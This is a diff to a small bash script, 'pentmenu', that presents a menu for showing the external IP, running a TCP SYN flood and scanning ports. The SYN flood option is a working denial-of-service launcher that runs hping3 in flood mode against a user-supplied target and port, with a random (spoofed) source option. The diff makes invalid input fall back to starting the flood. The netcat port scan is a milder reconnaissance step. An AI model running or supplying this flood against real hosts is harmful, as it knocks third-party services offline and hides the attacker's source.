@@ -1,22 +1,30 @@
 #!/bin/bash
+## create menu and show welcome message
+echo ""
+echo "Welcome to pentmenu! Please use this script responsibly!"
+echo ""
 options=("Show IP" "TCP SYN Flood" "TCP Port Scanner" "Quit")
-select opt in "${options[@]}"; do 
+select opt in "${options[@]}"; do
+## quit 
 	if [ "$opt" = "Quit" ]; then
 	echo "Quitting" && sleep 1 && clear
 	exit 0
+## show external IP
 	elif [ "$opt" = "Show IP" ]; then
 	echo "External IP lookup requires curl..."
 	echo "External IP is detected as:"
 	curl http://canihazip.com/s/
 	echo ""
+## TCP SYN Flood DOS using hping3
  	elif [ "$opt" = "TCP SYN Flood" ]; then
 	echo "TCP SYN Flood requires hping3..."
 	echo "Enter target"
 	read TARGET
 	echo "Enter target port"
 	read PORT
-	echo "Enter Source IP, or [r]andom or [i]nterface IP:"
+	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
 	read SOURCE
+	: ${SOURCE:=i}
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
 	sleep 1
@@ -29,8 +37,12 @@ select opt in "${options[@]}"; do
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
 	sleep 1
 	sudo hping3 --flood -p $PORT -S $TARGET
-	else echo "not a valid option!"
+	else echo "Not a valid option!  Using interface IP"
+	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+	sleep 1
+	sudo hping3 --flood -p $PORT -S $TARGET
 	fi
+## TCP SYN Port Scan using netcat
 	elif [ "$opt" = "TCP Port Scanner" ]; then
 	echo "TCP Port Scanner requires netcat..."
 	echo "Enter target"
@@ -41,7 +53,8 @@ select opt in "${options[@]}"; do
 	sleep 1
 		netcat -zv $TARGET $PORT
 	else
-  	echo  "That's not a valid option!"
+## Default if no menu option selected is to return an error
+  	echo  "That's not a valid option! Hit Return to show main menu"
 	fi
 done
 exit 0
